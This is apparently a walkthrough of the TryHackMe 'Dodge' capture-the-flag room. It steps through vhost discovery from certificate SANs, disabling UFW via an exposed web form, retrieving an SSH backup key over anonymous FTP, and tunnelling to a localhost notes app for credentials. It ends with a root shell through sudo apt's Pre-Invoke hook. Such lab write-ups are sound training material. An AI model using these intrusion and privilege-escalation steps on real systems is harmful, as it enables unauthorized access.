---
title: "TryHackMe Dodge — Walkthrough"
date: 2026-03-12 17:30:00 +0300
categories: [TryHackMe, Web]
tags: [subdomain-enumeration, ufw, ftp, ssh, port-forwarding, sudo, linux]
pin: false
---

## Overview

| Field | Value |
| ----- | ----- |
| **Platform** | TryHackMe |
| **Room** | [Dodge](https://tryhackme.com/r/room/dodge) |
| **Difficulty** | Medium |
| **Focus** | Subdomain discovery, firewall misconfiguration, FTP, internal web apps, sudo abuse |

This room begins on a hardened Apache host where plain HTTP and HTTPS both return **403** until you map the correct virtual hosts. Certificate SAN entries expose several `*.dodge.thm` names; one internal-facing dev host ships a JavaScript-driven firewall panel that can disable **UFW**. Once FTP becomes reachable, anonymous access leaks an SSH private key backup. A follow-on pivot through a localhost-only notes application yields credentials for a second user, and that account's passwordless `sudo` rights on `apt` finish the box.

> Add a room banner or target IP screenshot here.
> {: .prompt-tip }

## Enumeration

### Nmap scan

Starting with a full-port service scan against the target IP:

```bash
nmap -T4 -n -sC -sV -Pn -p- <TARGET_IP>
```

Only three TCP ports respond:

| Port | Service | Version | Initial impression |
| ---- | ------- | ------- | ------------------ |
| 22 | SSH | OpenSSH 8.2p1 Ubuntu | Standard remote access |
| 80 | HTTP | Apache 2.4.41 | Default page returns **403 Forbidden** |
| 443 | HTTPS | Apache 2.4.41 | TLS enabled; default vhost also **403** |

The scan's SSL script output is valuable: the certificate subject is **`dodge.thm`**, and the SAN extension enumerates additional hostnames you would not discover through directory brute force alone.

![Full nmap output including ssl-cert script results](/assets/img/posts/dodge/nmap-scan.png)

### Building the subdomain list

Nmap already prints the SAN names, but you can cross-check manually:

1. Browse to `https://<TARGET_IP>` in Firefox (or any browser).
2. Open certificate details and copy every DNS name listed.

Map them in `/etc/hosts`:

```text
<TARGET_IP> dodge.thm www.dodge.thm blog.dodge.thm dev.dodge.thm touch-me-not.dodge.thm netops-dev.dodge.thm ball.dodge.thm
```

![TLS certificate viewer showing SAN entries](/assets/img/posts/dodge/tls-san.png)

### Probing virtual hosts

Hitting each hostname directly in a browser mostly returns **403**. To speed up triage, build a small Host-header wordlist:

```text
<TARGET_IP>
dodge.thm
www.dodge.thm
blog.dodge.thm
dev.dodge.thm
touch-me-not.dodge.thm
netops-dev.dodge.thm
ball.dodge.thm
```

Run `ffuf` across both HTTP and HTTPS while filtering out 403 responses:

```bash
ffuf -u 'PROTO://<TARGET_IP>/' \
  -H "Host: HOST" \
  -w <(echo -e "http\nhttps"):PROTO \
  -w subdomains.txt:HOST \
  -fc 403
```

Three hosts stand out with **200 OK**:

**`https://www.dodge.thm/`** — Static Bootstrap marketing site. No obvious upload forms or dynamic content, but confirms the vhost routing works.

**`https://dev.dodge.thm/`** — Serves a full **`phpinfo()`** page. Useful for confirming PHP version, disabled functions, and document root paths.

**`https://netops-dev.dodge.thm/`** — Appears blank in the browser viewport, but view-source reveals two script tags loading `/firewall.js` and `/main.js`.

Inspecting `firewall.js` shows it issues a `fetch()` to **`firewall10110.php`**:

```javascript
fetch('firewall10110.php', {
  method: 'GET',
  headers: {
    'Content-Type': 'application/json'
  }
})
```

Navigating directly to `https://netops-dev.dodge.thm/firewall10110.php` dumps live **`ufw status verbose`** output. Key observations:

- Firewall state: **active**
- Default policy: deny incoming, allow outgoing
- Ports **22, 80, 443** are explicitly allowed inbound
- Port **21 (FTP)** is **denied** inbound on both IPv4 and IPv6

![netops-dev HTML source showing script includes](/assets/img/posts/dodge/firewall-js.png)

![firewall10110.php displaying active UFW rules](/assets/img/posts/dodge/ufw-active.png)

## Foothold

### Disabling UFW through the web panel

The same PHP page that prints firewall status also exposes a submission form for running UFW instructions. The placeholder text hints at the expected syntax: **`sudo <command> <parameter>`**.

I first attempted typical command-injection strings; each returned an **Invalid command** message, suggesting basic filtering rather than a blind shell primitive. Supplying a legitimate UFW instruction worked immediately.

Submit:

```text
sudo ufw disable
```

The response reads: **Firewall stopped and disabled on system startup**. Reloading the page now shows **`Status: inactive`**.

![Form submission and inactive firewall confirmation](/assets/img/posts/dodge/ufw-disable.png)

With UFW no longer blocking port 21, the next service to investigate is FTP.

### Accessing FTP

Verify the newly exposed port:

```bash
nmap -p 21 -sV dodge.thm
```

Port 21 should now report open. Connect with the standard FTP client:

```bash
ftp dodge.thm
```

At the username prompt, enter **`anonymous`**. Leave the password blank (or supply a dummy email if prompted). A successful login banner similar to **Welcome to Dodge FTP service** confirms access.

The root listing resembles a Linux home directory rather than a public file share:

```bash
ftp> dir -a
```

Notable entries:

| Name | Type | Notes |
| ---- | ---- | ----- |
| `.bash_history` | file | Prior command history |
| `.bashrc` / `.profile` | file | Shell startup files |
| `.cache` / `.local` | directory | User application data |
| `.ssh` | directory | SSH configuration and keys |
| `user.txt` | file | Readable only by owner (`r--------`) — not yet accessible over FTP |

Descend into `.ssh`:

```bash
ftp> cd .ssh
ftp> dir
```

Three files appear:

| File | Permissions | Purpose |
| ---- | ----------- | ------- |
| `authorized_keys` | world-readable | Identifies which local user owns this home directory |
| `id_rsa` | owner-read only | Primary private key — not downloadable anonymously |
| `id_rsa_backup` | executable bit set | Backup private key — **can be retrieved** |

Pull the two readable artifacts locally:

```bash
ftp> get id_rsa_backup
ftp> get authorized_keys
```

Inspect `authorized_keys` on your machine. The key comment or options line reveals the associated account name: **`challenger`**.

The backup key file is a standard PEM-encoded RSA private key suitable for SSH authentication once permissions are corrected.

![FTP session showing anonymous login and file downloads](/assets/img/posts/dodge/ftp-login.png)

![Directory listings for home and .ssh folders](/assets/img/posts/dodge/ftp-ssh.png)

### Shell as challenger

SSH refuses keys with loose filesystem permissions. Restrict the backup key before connecting:

```bash
chmod 600 id_rsa_backup
ssh -i id_rsa_backup challenger@dodge.thm
```

A successful login lands you in `/home/challenger`. Confirm identity:

```bash
challenger@thm-lamp:~$ id
uid=1003(challenger) gid=1003(challenger) groups=1003(challenger)
```

The user flag sits in the home directory. Verify length before reading (TryHackMe flags are typically 32 hex characters plus formatting):

```bash
challenger@thm-lamp:~$ wc -c user.txt
38 user.txt
```

```bash
challenger@thm-lamp:~$ cat user.txt
```

![SSH login and user flag retrieval](/assets/img/posts/dodge/challenger-shell.png)

## Shell as cobra

### Locating the internal notes application

With an interactive shell, enumerate web roots:

```bash
challenger@thm-lamp:/var/www$ ls
default_html  html  html_www  notes  www
```

The **`notes`** directory was never exposed through external vhosts. Determine how it is served:

```bash
challenger@thm-lamp:/var/www$ cat /etc/apache2/sites-enabled/notes.conf
```

The virtual host binds to **`127.0.0.1:10000`** with `DocumentRoot /var/www/notes` — localhost only, explaining why nmap never flagged port 10000 externally.

Confirm the listener:

```bash
challenger@thm-lamp:/var/www$ ss -tln
```

Look for **`127.0.0.1:10000`** in the LISTEN state.

Because the service is loopback-restricted, tunnel it through your existing SSH session. Open the SSH escape channel (`Enter`, then `~C`) and add a local forward:

```bash
ssh> -L 10000:127.0.0.1:10000
Forwarding port.
```

On your attack machine, browse to **`http://127.0.0.1:10000`**. A login page loads under `/public/html/login.php`.

View the page source — developers left HTML comments containing valid application credentials:

```html
<!-- username: [REDACTED] -->
<!-- password: [REDACTED] -->
```

Authenticate with those values. After login, open **`/public/html/dashboard.php`**. The dashboard stores a note with **`cobra`** credentials in plain text (username and password separated by a slash or similar delimiter).

Attempting **`ssh cobra@dodge.thm`** with the recovered password fails (key-based or PAM restrictions). From the active **`challenger`** session, switch users instead:

```bash
challenger@thm-lamp:~$ su cobra -
Password: [REDACTED]
cobra@thm-lamp:/home/challenger$ id
uid=1002(cobra) gid=1002(cobra) groups=1002(cobra)
```

![Port-forward setup and notes login/dashboard](/assets/img/posts/dodge/notes-creds.png)

![su cobra confirming uid 1002](/assets/img/posts/dodge/cobra-shell.png)

### Alternate path to cobra credentials

Port forwarding is not strictly required. User **`challenger`** can read the notes application source under `/var/www/notes`.

Inspect the API endpoint:

```bash
challenger@thm-lamp:/var/www/notes$ cat api/posts.php
```

The file embeds a Base64 string representing a JSON array of posts. Decode it locally:

```bash
echo 'W3si...REDACTED...In1d' | base64 -d | jq
```

Parsed structure:

```json
[
  {
    "title": "To-do list",
    "content": "Define app requirements: 1. Design user interface. 2. Set up development environment. 3. Implement basic functionality."
  },
  {
    "title": "My SSH login",
    "content": "cobra / [REDACTED]"
  }
]
```

The second entry exposes the same **`cobra`** password without touching the web UI.

![Decoded posts.php JSON output](/assets/img/posts/dodge/posts-api-decode.png)

## Shell as root

### Abusing NOPASSWD sudo on apt

From **`cobra`**, enumerate elevated privileges:

```bash
cobra@thm-lamp:~$ sudo -l
Matching Defaults entries for cobra on thm-lamp:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User cobra may run the following commands on thm-lamp:
    (ALL) NOPASSWD: /usr/bin/apt
```

`cobra` may invoke **`/usr/bin/apt`** as any user without a password — a high-impact misconfiguration.

[GTFOBins](https://gtfobins.github.io/gtfobins/apt/) documents abusing APT's pre-invoke hook to spawn an interactive shell:

```bash
cobra@thm-lamp:~$ sudo apt update -o APT::Update::Pre-Invoke::=/bin/sh
# id
uid=0(root) gid=0(root) groups=0(root)
```

You now have a root context. Locate the root flag (commonly `/root/root.txt`) and verify size:

```bash
# wc -c /root/root.txt
38 /root/root.txt
```

```bash
# cat /root/root.txt
```

![sudo -l output, apt privesc, and root flag](/assets/img/posts/dodge/root-shell.png)

## Flag

| Flag | Obtained as | Location |
| ---- | ----------- | -------- |
| User | `challenger` | `~/user.txt` |
| Root | `root` (via apt) | `/root/root.txt` |

> Replace `[REDACTED]` credential placeholders and flag values with your own captures when publishing final screenshots.
> {: .prompt-info }

## Takeaways

- **SAN fields on TLS certificates** are enumeration gold — they often disclose dev and internal hostnames that never appear in public DNS.
- **403 on every vhost** does not mean dead ends; Host-header fuzzing separates live sites from default-deny configs.
- **Operational tooling on the web** (here, a UFW manager) can undo network hardening with a single misconfigured form.
- **Anonymous FTP** paired with home-directory misplacement leaks keys and confirms usernames via `authorized_keys`.
- **Loopback-only web apps** remain reachable through SSH port forwarding once you have shell.
- **Credentials in HTML comments and API blobs** are still common in CTF and real misconfigurations — inspect source, not just rendered pages.
- **`NOPASSWD` on package managers** is root-equivalent; always escalate `sudo -l` output against GTFOBins early.
